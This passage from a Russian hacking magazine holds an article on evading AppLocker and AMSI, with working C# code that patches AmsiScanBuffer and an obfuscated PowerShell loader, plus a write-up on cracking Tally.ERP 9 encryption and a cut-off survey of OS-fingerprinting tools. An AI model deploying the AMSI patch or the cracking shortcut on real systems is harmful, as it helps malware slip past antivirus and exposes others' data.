tory. В PowerShell даже существует модуль AppLocker, c помощью которого
можно запросить правила, применяемые в данной системе. Например, сле‐
дующий скрипт представит правила AppLocker в удоб ном формате.


Import‐Module AppLocker
[xml]$data = Get‐AppLockerPolicy ‐effective ‐xml


Write‐Output "[+] Printing Applocker Rules [+]`n"
($data.AppLockerPolicy.RuleCollection | ? { $_.EnforcementMode
‐match "Enabled" }) | ForEach‐Object ‐Process {
    Write‐Output ($_.FilePathRule | Where‐Object {$_.Name ‐NotLike "(
Default Rule)*"}) | ForEach‐Object ‐Process {Write‐Output "=== File
Path Rule ===`n`n Rule Name : $($_.Name) `n Condition : $($_.Condit
ions.FilePathCondition.Path)`n Description: $($_.Description) `n
Group/SID : $($_.UserOrGroupSid)`n`n"}
    Write‐Output ($_.FileHashRule) | ForEach‐Object ‐Process {
Write‐Output "=== File Hash Rule ===`n`n Rule Name : $($_.Name) `n
File Name :  $($_.Conditions.FileHashCondition.FileHash.Source
FileName) `n Hash type : $($_.Conditions.FileHashCondition.FileHash.
Type) `n Hash :  $($_.Conditions.FileHashCondition.FileHash.Data) `n
Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)
`n`n"}
    Write‐Output ($_.FilePublisherRule | Where‐Object {$_.Name
‐NotLike "(Default Rule)*"}) | ForEach‐Object ‐Process {Write‐Output
"=== File Publisher Rule ===`n`n Rule Name : $($_.Name) `n Publis
herName : $($_.Conditions.FilePublisherCondition.PublisherName) `n
ProductName : $($_.Conditions.FilePublisherCondition.ProductName) `n
BinaryName : $($_.Conditions.FilePublisherCondition.BinaryName) `n
BinaryVersion Min. : $($_.Conditions.FilePublisherCondition.Binary
VersionRange.LowSection) `n BinaryVersion Max. : $($_.Conditions.
FilePublisherCondition.BinaryVersionRange.HighSection) `n Descri
ption: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
}


Об ход правила хеша файлов
В качестве алгоритма хеширования в этом правиле по умолчанию исполь‐
зуется SHA‐256. Единственный способ, которым можно получить нелеги тим‐
ные функции исполняемых приложений в обход данного правила, — это инъ‐
екция DLL (конечно, если приложение заг ружа ет DLL). К при меру, в Process
Explorer была уязвимость, которая поз воляла загрузить через DLL вредонос‐
ный код.
   Таким образом,  если существует  пра вило,  позволяющее  запускать
Process Explorer, то можно выполнить код. На иллюс трации ниже была заг‐
ружена DLL, запускающая calc.exe.





                   Правило для Process Explorer





             Запуск calc.exe с помощью Process Explorer

Вместо запуска калькулятора можно использовать более сущес твенную наг‐
рузку. Тем не менее главная задача выполнена — получи лось обойти
AppLocker.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ЗАЩИТА ОТ ДЕТЕКТА
    ACTIVE DIRECTORY  В
             КАК ОБМАНУТЬ СРЕДСТВА ОБНАРУЖЕНИЯ
                          ПРИ АТАКЕ НА ДОМЕН





Об ход правила пути
Это правило — самое распространенное, его применя ют почти везде. Так
как условием данного пра вила является рас положение файла в фай ловой
системе компьютера или в сети, то и обойти его довольно легко. На одной
из конференций было представлено пра вило, которое позволяло запуск
исполняемого файла из директории C:\Python27.




       Правило, разреша ющее запуск из директории C:\Python27

Таким образом, если каталог доступен для записи, есть воз можность раз‐
местить в нем (а впоследс твии и выполнить) любой файл.





       Запуск файла из директории C:\Python27 в обход AppLocker


Об ход правила издателя
Цифровая подпись содержит информацию о компании — разработчике при‐
ложения, то есть об изда теле. Таким обра зом, это правило идентифицирует
приложение на основе его цифровой подписи и расширенных атрибутов.
В случае исполняемых файлов, DLL и установщиков Windows эти атрибуты
содержат наз вание продукта, частью которого будет файл, предоставленное
издателем оригинальное имя файла и номер его версии. В случае упакован‐
ных приложений и их уста новщиков расширенные атрибуты содержат имя
и версию приложе ния.
   Указанный тип правил — один из самых безопас ных, и обходные пути
очень ограничены. AppLocker проверя ет, действительна подпись или нет,
поэтому оператор не может просто подписать приложение ненадежными
сертификатами. Но данное пра вило можно обойти с помощью того же спо‐
соба, что и правило хеша, ведь инъ екцию DLL с использовани ем этого пра‐
вила никак не обнаружить.


Техника LOLBas
Эта техника демонстрирует функции при ложений, о которых большинство
системных администраторов могут и не знать. Полный спи сок приложений,
а также способы эксплуата ции раз личных функций этих программ можно пос‐
мотреть тут. К примеру, с помощью Wsreset.txt можно обойти UAC, а с
помощью Advpack.dll — выполнять команды ОС.





                 LOLBas для некоторых приложений

Ниже представлен пример выполнения команды ОС с помощью Advpack.
dll.





              Вызов cmd.exe с помощью Advpack.dll


ОБХОД POWERSHELL AMSI
Antimalware Scan Interface (AMSI) позволяет приложениям и службам интегри‐
роваться с любым име ющимся на компь юте ре про дуктом для защиты от вре‐
доносных программ. AMSI не зависит от пос тавщика антивирусных решений.
Он разработан c учетом наиболее распространенных методов сканирования
и защиты от них. К тому же AMSI поддерживает структуру вызовов, позволя‐
ющую сканировать файлы, память или поток, проверять URL/IP‐адреса
источника. Таким образом, AMSI сканиру ет, находит и блокирует все, что,
по его мнению, может нанес ти вред системе.
  По умолчанию AMSI работает с Microsoft Defender. Защитник Windows
отменит свою регистра цию в качестве поставщика AMSI и отключится, когда
другой антивирусный движок зарегистрируется в этом качес тве.
  Ошибки выполнения кода, вызываемые AMSI, можно получить при исполь‐
зовании таких известных сценариев, как PowerShell Empire или PowerSploit.
На самом деле AMSI детектирует вредонос ное ПО на основе известных
строк. К примеру, если хоть где‐то в коде встретится строка amsiutils, даль‐
нейшее выполнение кода будет заблокировано.





              Ошибка выполнения, выз ванная AMSI

Обойти  сканирование  на  основе  извес тных  строк  легко:  достаточно
не использовать строки в целом виде. То есть, если мы разобьем строку am‐
siutils на строки ams, iut и ils, код будет успешно выполнен.


           Конкатенация строк для обхода ска нирования AMSI

Но при использовании серьезных сценариев этот трюк может не сработать.
Таким образом, мы можем вооб ще уйти от конкатена ции разделенных строк
благодаря простому кодированию и декодированию строк. Таким способом
мы получим исходную строку в момент выполнения. В качестве кодировки
можно использовать Base64.





    Использование кодировки Base64 для обхода сканирования AMSI

Но если мы сге нерируем полезную нагрузку и закодируем ее в Base64, то
AMSI все равно ее распознает (не помога ет скрыться даже двойное кодиро‐
вание Base64)! Поэтому куда более надеж ным способом будет исполь‐
зование XOR.





          Использование XOR для обхода ска нирования AMSI

Но XOR тоже можно распознать, правда для этого потребуется более
высокая  абстракция.  Поэто му  лучше  исполь зовать  комбинированные
решения: например, XOR + Base64, Base64 + ROT13.
   Как мы уже говорили в прошлых стать ях, гораз до удобнее немного модер‐
низировать средство защиты, тем самым меняя его функциональные воз‐
можности. То же самое и с AMSI: обход строк — это хорошо, но лучше, когда
оператор использует полные скрипты и ему ничего не мешает.
  AMSI имеет несколько функций, которые выполняются перед запуском
любого кода PowerShell (начиная с PowerShell 3.0), поэтому, чтобы полностью
обойти AMSI и выполнить любой вредоносный скрипт PowerShell, оператору
необходимо внести поправки непос редственно в памяти.
  AMSI защищает PowerShell, загружая биб лиотеку amsi.dll в область
памяти PowerShell. При этом AMSI не раз личает поль зователя с низкими при‐
вилегиями и привилегированного пользователя, такого как админис тратор
какой‐нибудь службы. AMSI загружает свою DLL для любого экземпляра Pow‐
erShell и сканирует консоль PowerShell с помощью Windows Defender, чтобы
определить,  следует ли бло кировать операцию  с полезной  нагрузкой
или разрешить ее выполнение.
  Для начала необ ходимо собрать DLL‐биб лиотеку, которая будет отключать
AMSI. Немного изменив код (представленный на одной из конференций —
сейчас я уже не вспомню, на какой), чтобы уйти от использования слов AMSI,
BYPASS и подобных, получа ем следующую DLL:


using System;
using System.Runtime.InteropServices;


public class A
{
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80,
0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80,
0xC2, 0x18, 0x00 };


    public static void B()
    {
        if (is64Bit())
            PA(x64);
        else
            PA(x86);
    }


    private static void PA(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("amsi.dll");
            var addr = Win32.GetProcAddress(lib, "Am" + "siS" + "ca"
+ "nBu" + "ffer");


            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40,
out oldProtect);


            Marshal.Copy(patch, 0, addr, patch.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }


    private static bool is64Bit()
        {
            bool is64Bit = true;


            if (IntPtr.Size == 4)
                is64Bit = false;


            return is64Bit;
        }
}


class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string
 procName);


    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);


    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress,
UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}

Теперь используем  PowerShell‐скрипт для  загрузки DLL и выполнения
целевой функции. Исходный сценарий, который работал на момент представ‐
ления этой методики на конференции, уже легко обнаруживается AMSI.


function B‐A
{
    if(‐not ([System.Management.Automation.PSTypeName]"A").Type) {
        [Reflection.Assembly]::Load([Convert]::FromBase64String("DLL
библиотека в BASE64")) | Out‐Null
        Write‐Output "DLL has been reflected";
    }
    [A]::B()
}





        Сообщение Windows Defender при обнаружении скрипта

Это происходит потому, что AMSI способен снять кодировку Base64. Но мож‐
но комбинировать методы обхода. К примеру, Base64 + XOR + Base64.
Закодируем DLL с помощью следующего скрипта на Python.


#!/usr/bin/python3


import base64


with open("./AB.dll", "rb") as file:
    dll = file.read()


enc = base64.b64encode(dll)
encxor = bytes( [ 96^byte for byte in enc ] )
encenc = base64.b64encode(encxor)


print(encenc)

Тогда PowerShell‐скрипт будет выглядеть следующим образом.


function A‐B
{
    if(‐not ([System.Management.Automation.PSTypeName]"A").Type) {
        $encenc = "Закодированная DLL библиотека"
        $enc = [Text.Encoding]::UTF8.GetString([Convert]::FromBa
se64String($encenc))
        $dec=@()
        foreach($byte in [Text.Encoding]::UTF8.GetBytes($enc)){ $dec
+= $byte ‐bxor 96 }
        $u = [Text.Encoding]::UTF8.GetString($dec)
        [Reflection.Assembly]::Load([Convert]::FromBase64String($u))
| Out‐Null
        Write‐Output "DLL has been reflected"
    }
    [A]::B()
}





       Отклю ченный AMSI больше не реаги рует на опасные строки

Это очень полезная и удобная техника, поз воляющая работать со скриптами,
которые AMSI блокировал.


ЗАКЛЮЧЕНИЕ
На этом мы заканчиваем тему защиты от обна ружения. Помни, главное —
не достичь цели, а остаться незамеченным! Для тех, кто хочет получить боль‐
ше информации о проникновении в Active Directory, я создал телеграм‐канал
@RalfHackerChannel. Здесь ты сможешь задать свои вопросы (или ответить
на вопросы других юзеров). До встречи в следующих статьях!
ВЗЛОМ

 ШИФРОВАНИЕ
        ПО-ИНДИЙСКИ

             ВЗЛАМЫВАЕМ TALLY.ERP 9:
                АНАЛОГ 1С ИЗ СТРАНЫ
                       КОНТРАСТОВ





                                                                             Олег Афонин
                                                                                     Эксперт по мобильной
                                                                                   криминалистике компании
                                                                                        «Элкомсофт»
                                                                                             aoleg@voicecallcentral.com





Tally.ERP  9 —  своеобразный  индийский  аналог  сис‐
темы 1С:Предприятие. Сам про изводитель опре деляет про‐
дукт как программное обеспечение для управления биз‐
несом нового поколения для бизнеса нового поколения
(именно  так), созданное, сно ва процитирую соз дателей,
«для нас лаждения». Сегодня мы собираемся насладиться
продуктом по полной программе, взломав зашифрованные
данные и проанализировав совершенно восхитительную
схему защиты.


ЧТО ТАКОЕ TALLY.ERP 9
Несмотря на более чем сомнительное описание, Tally.ERP 9 достаточно
популярный в Индии про дукт с более чем дву мя миллионами пользовате лей.
С учетом размера целевой аудитории, Tally — одно из самых популярных
решений такого рода в Индии.





Неудивительно,  что  индийская  полиция  обратилась  к  разработчикам
«Элкомсофт» с просьбой взло мать защищенное хранилище  Tally.ERP  9.
В таких случаях мы стараемся не прос то взло мать конкретную базу данных,
а добавить поддержку соответс тву ющего формата в один из наших продук‐
тов. Именно по это му сценарию и начали раз вивать ся события.
   Каким образом обычно шифруют документы и внутренние базы данных?
Как правило, компании действуют без огонька. В качестве алгоритма шиф‐
рования выбирают AES с клю чом длиной 128, 192 или 256 бит. Ключ шиф‐
рования данных Media Encryption Key (MEK) создает ся одним из стандартных
криптографически стойких алго ритмов генерации случайных чисел, пос ле
чего этот ключ шифруется ключом шифрования клю ча шифрования Key En‐
cryption Key (KEK). KEK, в свою очередь, генерируется на основе комбинации
пароля пользователя и соли с помощью одной из стандартных хеш‐функций
(чаще всего это SHA‐1, SHA‐256 или SHA‐512). Стойкость алгоритма усилива‐
ется увеличением числа итераций хеш‐функции; нам попадались варианты
от 10 тысяч ите раций (это очень быстрый перебор) до миллиона (соответс‐
твенно, перебор очень медленный) включительно. Если упростить до пре‐
дела, для того чтобы добавить поддержку нового формата, нам нужно просто
определить, каким именно алго ритмом хеширо вания вос пользовал ся про‐
изводитель, найти число итераций и мес то, куда сохраняется соль.
  В случае с Tally.ERP 9 все пошло не так.


ШИФРОВАНИЕ TALLY VAULT
В состав Tally.ERP 9 входит реализация безопас ного хранилища под названи‐
ем Tally Vault. Шифрование в ERP 9 опци ональное; пароль задавать совер‐
шенно не обязательно. Пароль хра нилища можно задать как при создании
компании, так и в любой момент пос ле этого.





Когда пользователь задает пароль, система соз дает новое, защищенное хра‐
нилище. Старое, незащищенное,  остается;  впоследс твии  пользователь
может его удалить. Для нас же эта схема чрезвычайно удобна: зашифрован‐
ную копию хранилища можно напрямую сравнить с незашифрованной.
   Вот  как  выглядит  выбор  компании,  если  есть  и зашифрованная,
и незашифрованная версия данных.





Данные в последних версиях Tally.ERP 9 по умолчанию сохраняются в c:\
Users\Public\Tally.ERP9\Data\(1nnnn).





Зашифрованы будут все файлы с расширением .900, раз мер которых пре‐
вышает 512 байт. Основной файл хранилища — Company.900. В этом файле
сохраняется информация о пользователях, если вклю чена опция Use security
control. Вот как выглядит этот файл в hex‐редакторе до шифрования.





А вот так — после.





Формат файла
Файл логически разбит на секторы/страницы по 512 байт. В начале каждой
страницы записаны четыре байта контрольной суммы (CRC). При проверке
блока на целостность вычисляется CRC осталь ных 512 – 4 байт и сравнива‐
ется с первыми четырьмя байтами.


Ключ шифрования
Ключ шифрования получа ется из пароля напрямую; никакой соли и тем более
разделения на Media Encryption Key и Key Encryption Key здесь нет. Индий‐
ские разработчики решили не полагать ся на сущес твующие криптографичес‐
кие преобразования и создали свой собственный вари ант, настоящий кош‐
мар криптографа.
  Все алгоритмы хеширования без исключений гарантиру ют, что изменение
всего одного бита в хешируемой пос ледователь нос ти приведет к сильнейше‐
му изменению в хеше. Индийским раз работчикам удалось сделать неверо‐
ятное: они создали хеш‐функцию, в которой при небольшом изме нении
пароля результат тоже меняется очень незначительно. Более того, у нас соз‐
далось впе чатление, что при определен ных условиях этот хеш можно обра‐
тить, получив из него оригинальный пароль (разумеется, если энтропия
пароля не превышает энтро пии его контрольной суммы). Вишенка на торте:
преобразование применя ется ровно один раз.
  К примеру, вот так выглядят клю чи шифрования на основе паролей,
в которых попарно различается один символ:


 Пароль         Ключ

 pwd1               0x653C68AC 0x4BA84BA8      (ac 68 3c 65 a8 4b a8 4b)

 pwd2               0x653C69A7 0x4BA84BA8      (a7 69 3c 65 a8 4b a8 4b)

  password1           0x74258DD3 0x57CE36D7      (d3 8d 25 74 d7 36 ce 57)

  password2           0x90A78DD3 0xB34C36D7      (d3 8d a7 90 d7 36 4c b3)

  password12345678    0xC6C57C3D 0xE52EC739      (3d 7c c5 c6 39 c7 2e e5)

  password12345679    0xC6C51936 0xE52EA232       (36 19 c5 c6 32 a2 2e e5)

  qwertyui123456789    0xD15D72DD 0x06309E8D      (dd 72 5d d1 8d 9e 30 06)

  qwertyuj123456789    0xD15D4D77 0x0630A127       (77 4d 5d d1 27 a1 30 06)


Ал горитм шифрования
Страницы шифруются алгорит мом, прин цип работы которого сильно напоми‐
нает обычный DES. Для шифрования используется 64‐битный ключ (который
во время работы разворачивается в рас ширенный 128‐битный, как и у нас‐
тоящего DES). Шифрование блочное, размер блока — привычные для алго‐
ритма DES 64 бита. Алгоритм используется в режиме CBC с первоначальной
инициализацией IV нулями.
  Напомню, DES (Data Encryption Standard) — алгоритм симметричного
шифрования, утвержденный правитель ством США в 1977 году в качестве
официального стандарта. В 2001‐м от использования DES отказались; ему
на смену пришел привычный нам алгоритм AES. Что заставило индийских
разработчиков взять за осно ву принципы работы именно этого алгоритма —
для нас загадка, но если ставку сделали на «никто не догадается», то они
ошиблись.
  Уже на этом месте можно прекратить исследова ние и реализовать прос‐
тейшую атаку на ключ. На современном оборудовании все прос транство клю‐
чей можно перебрать за считаные дни. При желании можно выполнить рефак‐
торинг ключей; впрочем, принцип «неуловимого Джо» надежно защищает Tally
от подобных атак.


Про верка пароля
В коде  Tally  Vault пароль про веря ется так: рас шифровывается страница
(все 512 – 4 байт), вычисляется ее контрольная сумма (CRC) и сравнивается
со значением, записанным в начале стра ницы. По замыс лу раз работчиков,
для расшифровки всей страницы и полной про верки пароля потребуется рас‐
шифровать 64 блока по 8 байт (64 бита). Однако в данном слу чае дьявол кро‐
ется в деталях, и для проверки пароля вычислять контрольную сумму всей
страницы совер шенно не обязательно.
  Вернемся к первому скриншоту.





В начале каждой  страницы  есть  служебная информация, содержимое
которой фиксировано или может быть извес тно заранее. Например, сразу
после CRC, по сме щению 4, находится 32‐битная фиксированная последова‐
тельность DWORD 0x00000001. Наз начение этой пос ледовательности нам
неизвестно; предположитель но, это флаг стра ницы данных. Соответс твенно,
чтобы ускорить проверку пра вильности пароля, мож но прервать рас шифров‐
ку страницы сразу после первого блока, если содержимое этих 32 бит данных
не 0x00000001. Разумеется, 32 бита данных гарантированно дадут кол лизии,
которые потенциально приведут к лож ным сра баты вани ям. Поэтому в слу‐
чаях, когда значение расшифрованных очередным ключом 32 бит данных сов‐
пало со значением 0x00000001, мы рас шифруем блок до конца, вычислим
CRC и сравним контрольную сумму со зна чением, записанным в пер‐
вых 4 байтах страницы. Одна ко количество таких коллизий будет поряд‐
ка 1 к 4 миллиардам, что практичес ки не влияет на скорость перебора
паролей.
   Кстати, если после прочтения этой статьи индийские разработчики изме‐
нят или вовсе убе рут фиксированное зна чение по смещению 4, можно
использовать и другие константы. Например, по смещению 12 записы вается
последовательный номер страницы, если страница не последняя.


Ре зультат
Вооружившись знанием об использованных алгоритмах хеширования и шиф‐
рования, мы разработали две версии плагина для Elcomsoft Distributed Pass‐
word Recovery. В первой версии плагина реализована «лобовая» атака,
в которой правильность пароля проверя ется именно так, как задумали индий‐
ские разработчики. Во второй для проверки используется константа в первом
зашифрованном блоке. Как и ожидалось, раз ница в скорости впе чатляет.
  Сравнение скорости на двух CPU:


 Ско рость       При   пол ной  При   про верке   кон стан ты
 (паролей        расшифровке   в  первом  бло ке  (сейчас
 в секун ду)       страницы      используется в EDPR)

  Intel Core i7 6700      170 000           5 400 000

  Intel Core i7 9700K    345 000              11 400 000

11 миллионов паролей в секунду на одном процессоре, без использования
GPU — много это или мало? Для сравнения: скорость атаки на CPU
для документов в формате .docx, созданных в Microsoft Oﬃce 2016, составля‐
ет порядка 40 паролей в секунду, OpenOﬃce — 9000. Скорость атаки на кон‐
тейнеры VeraCrypt — чуть больше одно го пароля в секунду. Атака на резер‐
вные копии iTunes — примерно один пароль в десять секунд. Архивы RAR —
порядка 64 паролей в секунду, 7zip — около 25.


Взлом
Для взлома паролей Tally Vault воспользуемся Elcomsoft Distributed Password
Recovery с соответствующим плагином. Откроем файл Company.900.





Далее настроим атаку по словарю. Можно исполь зовать как обыкновенный
словарь русского или английского языка, так и один из специфических сло‐
варей, содержащих самые рас простра ненные пароли или пароли, которые
были извле чены из браузера пользователя. В данном случае мы восполь‐
зовались паролями, которые извлекли из браузера Chrome, установленного
на компьютере пользователя.





Пароль обнаружился менее чем за секунду.





Усложнив задачу, запустили полный перебор, что бы посмотреть скорость
атаки, которая стабилизировалась на 11,1 миллиона паролей в секунду.





КАК БЫЛО БЫ ПРАВИЛЬНО
Как можно было бы реализовать шифрование пра вильным образом? В дан‐
ном случае достаточно было бы сделать «как все», а именно:
 1. В качестве алгоритма шифрования использовать стандартный AES с дли‐
   ной ключа 256 бит.
 2. Для шифрования данных использовать ключ Media Encryption Key (MEK),
   созданный криптографически стойким генератором случайных чисел.
 3. MEK сохранять в зашифрованном виде. Шифровать при помощи ключа
   Key Encryption Key (KEK).
 4. Key Encryption Key вычис лять пос редс твом одной из готовых KDF (Key Der‐
    ivation Function), исполь зующих многочисленные (порядка сотен тысяч)
   итерации хеш‐функции SHA‐256 или SHA‐512 на основе пароля поль‐
   зователя и соли.

Кроме того, если есть воз можность изменить формат файла, то стоит тща‐
тельно проанализировать страницы на предмет наличия констант или данных,
которые легко вычислить (нап ример, номеров стра ниц или внутренних иден‐
тификаторов). От таких данных нужно избавиться.


ЗАКЛЮЧЕНИЕ
Tally.ERP 9 полностью оправдал заявку маркетологов «соз дано для нас лажде‐
ния». Мы получили редкое удовольствие, создавая атаку на данные Tally Vault,
словно вернувшись на двадцать лет назад во времена слабой, зарегу лиро‐
ванной экспортными огра ничениями защиты.
   Что же касается самого Tally Vault, то разработ чики совершили все воз‐
можные и невозможные ошибки. Мы не смогли найти ни одного аспекта
защиты, который был бы реализован на уровне хотя бы школьника‐энтузиас‐
та. Беспросветно пло хо здесь абсолют но все. Здесь и прямое преобразова‐
ние пароля в ключ шифрования, и пренеб режение солью, и единственная
итерация доморощен ного  (и  абсолютно  безграмотно  реализованного)
хеширования. Исполь зование алго ритма на основе DES более чем сорока‐
летней давности в комбинации с корот ким ключом шифрования делают воз‐
можной атаку на ключ (а не на пароль), и только отсутствие спроса защищает
продукт от полного рефакторинга. Испра вить эти алгоритмы принципиально
невозможно, можно лишь сделать заново.
  Впрочем,  здесь  тот  случай,  ког да  и  «сделать  заново»,  вероятно,
не поможет. Фиксированные данные, находящиеся в самом начале страницы
данных, позволяют огра ничиться расшифровкой единственного 64‐битного
блока, что более чем в 30 раз ускоряет проверку. Нам же остается порадо‐
ваться очередному достижению: более 11 миллионов паролей в секунду
на единственном CPU, без использования даже аппаратного ускорения —
наш абсолютный рекорд за все время работы.
ВЗЛОМ





                                        ShəLMā
                                         u3ВиHuTE 3a HeP0Bнblй
                                                 п04ePk
                                            schelma@protonmail.com
АРСЕНАЛ
   ПЕНТЕСТЕРА

        СОБИРАЕМ УТИЛИТЫ
      ДЛЯ ДЕТЕКТА ОПЕРАЦИОНКИ
        НА УДАЛЕННОМ ХОСТЕ





Первая стадия пентеста — это, как известно, разведка.
Только установив, какая система работает на удаленном
хосте, можно начинать искать в ней лазейки. Из этой статьи
ты узнаешь про семь средств, которые помогают на этом
этапе, и заодно увидишь, как именно они вычисляют опе‐
рационку.


Примерно в тот же исторический период, когда обезьяна слезла с дерева
и зачем‐то решила стать человеком, она научилась использовать орудия тру‐
да. С тех пор так и повелось: каждая мартышка добывает себе пропитание
с помощью собственного инс трументария, что выгодно отличает ее от прочих
представителей фауны. А одним из самых богатых арсе налов сподручных
инструментов среди приматов обладают, безусловно, пентестеры и хакеры.
  Оно и не удивительно: изу чать уда лен ные системы и экс плуатировать
обнаруженные в них уязвимости голыми руками — все равно что пытаться
напугать ежа голым задором и неуемным энтузиаз мом. То есть и непрактич‐
но, и по большому счету бесполезно. Причем даже ежу понятно, что первый
и самый важный этап исследова ния любой системы — это раз ведка и сбор
информации. На нем и заострим наше внимание.
   Если ты регулярно читаешь «Хакер», то наверняка уже встречал упомина‐
ние многих из этих программ. Воз можно, тебе зна ком и термин TCP/IP stack
ﬁngerprinting, которым обознача ется прин цип их работы.
  Давай же окинем широким взглядом с высоты птичьего помета полета
наиболее актуальные утилиты, пригодные для этой цели, и постараемся оце‐
нить их особенности и возможности.


ПАРА УМНЫХ СЛОВ
Опытные пентестеры, хакеры и считающие себя таковыми могут сме ло про‐
пустить пару молочных коктейлей и этот раздел, для остальных же проведем
небольшой теоретический экскурс. Очевидно, что на начальном этапе раз‐
ведки удаленная система представляется для нас «черным ящиком», и в луч‐
шем случае мы знаем только IP‐адрес. Как минимум необходимо выяснить,
какие на исследуемом хосте открыты порты, под управлением какой опе раци‐
онной системы он работа ет, какой софт там установлен и способен взаимо‐
действовать с сетью. А уже затем, собрав необходимую информацию, можно
искать уязвимости и думать, как обратить их во бла го человечества.
  В случае с обыч ным компом или ноутбуком определить операционную
систему проще всего. Если при взгляде на экран слегка замутило — значит,
там стоит винда, захотелось что‐нибудь соб рать из исходников — однознач‐
но линукс. С удаленным хостом такой фокус не прокатит, поэтому мы можем
оценивать лишь косвенные признаки. Определить, какая операционная сис‐
тема работает на хосте, можно пас сивными и активными методами. В первом
случае обычно применяется сниффинг с помощью тулз вроде Wireshark
и последующий анализ трафика. Во втором слу чае используется принцип
паттернов: каждая ОС имеет характерный набор откры тых портов, на которые
можно постучаться и оценить их доступность. А потом, глядя на эту живопис‐
ную картину, сделать соответс тву ющие выводы. И в том и в дру гом случае мы
исследуем подобие отпечатков пальцев операци онной системы, поэтому
совокупность методов так и принято называть — ﬁngerprinting.
   Как правило, все методы пас сивно го анализа трафика сводятся к изу‐
чению стека TCP/IP на удален ной машине. Заголовки пакетов содержат поля,
значения которых характерны для стро го определенных ОС. Например, вре‐
мя жизни пакета TTL (Time To Live), равное 64, чаще всего встречается в Linux
и FreeBSD. Если в заголовке не уста новлен флаг фрагментации (DF, Don’t
Fragment), это намекает, что мы имеем дело с OpenBSD. Другими косвенны‐
ми признаками служат размер окна (window size), значение максимального
размера сегмента (maximum segment size, MSS), window scaling value, сос‐
тояние флага sackOK. Методом исключения мы можем вычислить ОС,
которая крутится на интересу ющем нас хос те. А облегчат это дело утилиты,
о которых и пойдет речь.


NMAP
 • Сайт: nmap.org
 • Платформа: GNU/Linux, macOS, Windows (x86)

Это очень популярный кросс‐платформенный инс трумент с богатой историей
и широким арсе налом функциональных воз можнос тей. Он умеет многое
и помимо фингерприн тинга, но нас интересу ют в первую оче редь его «раз‐
ведывательные возможности».
   Актуальная версия Nmap 7.80 обладает инту итивно понятным графичес‐
ким интерфейсом, но для олдфагов предус мотрен режим работы из коман‐
дной   строки.  В   этом   случае   можно   использовать   команду
nmap ‐O ‐PN [URL], где URL — адрес исследуемого сайта. Совсем упо‐
ротые упертые могут скомпилировать тулзу из исходников, любезно опуб‐
ликованных на сайте раз работчиков.





             Отчет о сканировании сайта ути литой Nmap

Диагноз об установленной на хосте операционной системе утилита выдает
весьма приблизительный, но вероятность того или иного варианта может
достигать 90% и даже больше. В принципе, это го впол не дос таточно, чтобы
понять, в каком направлении копать дальше.
  Кроме этого, программа любезно показывает сведения о версии работа‐
ющего там сервера, об открытых портах, информа цию, полученную в резуль‐
тате обработки DNS‐запросов, IP‐ и IPv6‐адреса, данные Classless inter‐do‐
main routing (CIDR). Софтина может выпол нить обратный просмотр DNS (re‐
verse DNS lookup), а также выводит большой объем другой полезной инфы.
В Nmap предусмотрено нес колько сценариев сканирования, выбор которых
зависит от целей иссле дова теля.
  Принципы работы прог раммы подробно описаны в документации на офи‐
циальном сайте, а если базовых воз можнос тей Nmap тебе недостаточно,
можно ознакомиться со статьей об их расширении. Утилита и впрямь очень
мощная: она позволяет даже об ходить файрволы, выпол нять DoS и дру гие
виды атак. Одним сло вом, полез ный инстру мент, если знаешь, как с ним
обращаться.


NETWORKMINER
 • Сайт: https://www.netresec.com/index.ashx?page=Networkminer
 • Платформа: GNU/Linux, Windows

NetworkMiner — это анализатор трафика, который сами раз работчики относят
к категории Network Forensic Analysis Tool (NFAT). Тул за использует пассивный
метод анализа удален ной системы, а зна чит, не оставляет никаких следов
и позволяет исследователю действовать незаметно.





         Интерфейс NetworkMiner дос таточно прост и понятен

Утилиту можно скачать с сайта http://sourceforge.net/projects/networkminer,
а на страничке разработ чиков дос тупен исходный код.
   NetworkMiner позволяет отслеживать установленные соединения и ана‐
лизировать передаваемые по сети пакеты, выуживая из них полез ные све‐
дения о хостах, с которыми твой компьютер обменивается информацией.
В качестве исходных данных для анализа используется TTL (время жизни
пакета), размер фреймов, установленные в заголовках пакетов флаги.
  С помощью NetworkMiner можно исследовать и отдельные фреймы.
Для этого служит вкладка Frames — здесь представлены данные о раз мере
фрейма, IP‐адре сах и портах отправителя и получателя, а также прочие
полезные сведения. Кроме это го, есть воз можность анализировать баннеры
демонов. Вся эта информа ция позволяет воссоздать структуру сети, где
выпол няется перехват пакетов: особен но это полезно для беспроводных
сетей, внутренняя кухня которых тебе нез накома.
   Есть у этой тулзы еще одна шикарная функция: она умеет вытас кивать
файлы из трафика, транслируемого по протоколам FTP, TFTP, HTTP, HTTP/2,
SMB, SMB2, SMTP, POP3 и IMAP. То есть с ее помощью можно перехватывать
файло, передаваемое по электропочте, FTP, по локал ке или попросту в бра‐
узере пользователя. Из шифрованного трафика NetworkMiner может выдер‐
гивать сертификаты X.509. Красота, да и только!
  В общем, перед нами вполне себе мощный сниффер, способ ный творить
волшебство в уме лых руках. Ну а фингерприн тинг и определе ние ОС — лишь
одна из его широчайших воз можнос тей.


P0F V3
 • Сайт: https://lcamtuf.coredump.cx/p0f3/
 • Платформа: GNU/Linux, Windows, macOS

Это не просто доволь но известный сниффер, а программа, объ единяющая
целый комплекс механизмов для ана лиза перехваченных пакетов и фингер‐
принтинга. При этом определение типа ОС на уда ленном узле (даже в слу‐
чаях, когда Nmap с этой задачей не спра вился, например из‐за исполь‐
зования в сети брандма уэра) заявляется раз работчиками в качестве одной
из основных функций.
  Имеется несколь ко режимов работы программы, которые можно исполь‐
зовать в зависимости от конфигура ции сети и стоящей перед исследова‐
телем задачи:
 • режим SYN, подразумевающий исследова ние входящих соединений;
 • режим SYN+ACK — исследова ние исходящих подключений;
